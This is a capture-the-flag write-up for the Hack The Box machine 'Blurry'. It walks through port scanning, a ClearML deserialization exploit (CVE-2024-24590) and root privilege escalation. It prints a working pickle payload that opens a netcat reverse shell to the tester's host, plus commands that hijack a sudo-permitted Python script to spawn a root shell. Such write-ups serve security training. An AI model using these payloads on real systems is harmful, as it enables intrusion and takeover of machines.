---
title: HTB Blurry Writeup
author: Elus1nist
layout: post
date: 16 June 2024
imagesrc: https://labs.hackthebox.com/storage/avatars/344998b24aad421410cabf912d3dc3af.png
---
Welcome! This is my writeup of the new Season 5 Medium machine from HTB, Blurry. 

---
---
## Enumerating Services and Open Ports


So to start, as usual we run an nmap TCP port scan:

```
nmap -sC -sV -p 22,80 -oN initial_scan 10.10.11.19
```
This gives us the scan results of:

```sh
Nmap scan report for 10.10.11.19
Host is up (0.16s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see an open HTTP port 80 and aother open SSH port 22. To access VHOST added the virtual host `app.blurry.htb` and `blurry.htb` to the `/etc/hosts` file

---
---
## Webpage Enumeration

Visiting the webpage we encounter:
<img src="{{- 'writeup_images/Blurry/WebPage_Landing.png' | relative_url}}" >

---
---
## ClearML RCE via Deserialization attack - CVE-2024-24590

Doing some research on the ClearML platform leads to a public CVE-2024-24590. Using the python module `clearml` this script can be created as a POC with the following steps:

1) Create a new task and mark it as review (this way the task is executed ask the service user)
2) Create Exploit object with Code Execution
3) Upload pickled artifact and execute task

```python
from clearml import Task
import pickle
import os

task = Task.init(project_name="Black Swan", task_name="Test 2", tags=["review"], task_type=Task.TaskTypes.data_processing)

class RunCmd:
    def __reduce__(self):
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.60 9001 >/tmp/f"
        return os.system, (cmd,)

command = RunCmd()

task.upload_artifact(name='revArtifact', artifact_object=command)

task.execute_remotely(queue_name='default')
```

Before running the above POC, a netcat listener was started `nc -lvnp 9001`. After execution a shell is obtained:
<img src="{{- 'writeup_images/Blurry/Reverse_Shell_Obtained.png' | relative_url}}" >

User Flag can be found - `cat ~/jippity/users.txt`
SSH Key found at - `~/.ssh/id_rsa`

---
---
## Privalege Escalation

As part of manual enumeration running `sudo -l` shows us local admin command:
```sh
(root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
```

When we examine the contents of `/usr/bin/evaluate_model` we can see the file `/models/evaluate_model.py` is called.
As we have read write privelages to the `/models` directory we can change the contents of the python file and achieve code execution:

```sh
### 1) Delete current file ###
rm -rf  /models/evaluate_model.py

### 2) create backdoor ###
echo -e 'import pty\npty.spawn("/bin/bash")' > /models/evaluate_model.py

### 3) Trigger backdoor and attain root ###
sudo /usr/bin/evaluate_model /models/*.pth
```

<img src="{{- 'writeup_images/Blurry/Root_Shell.png' | relative_url}}" >

We can now print the root flag - `cat /root/root.txt`




<img src="https://giffiles.alphacoders.com/206/206739.gif">
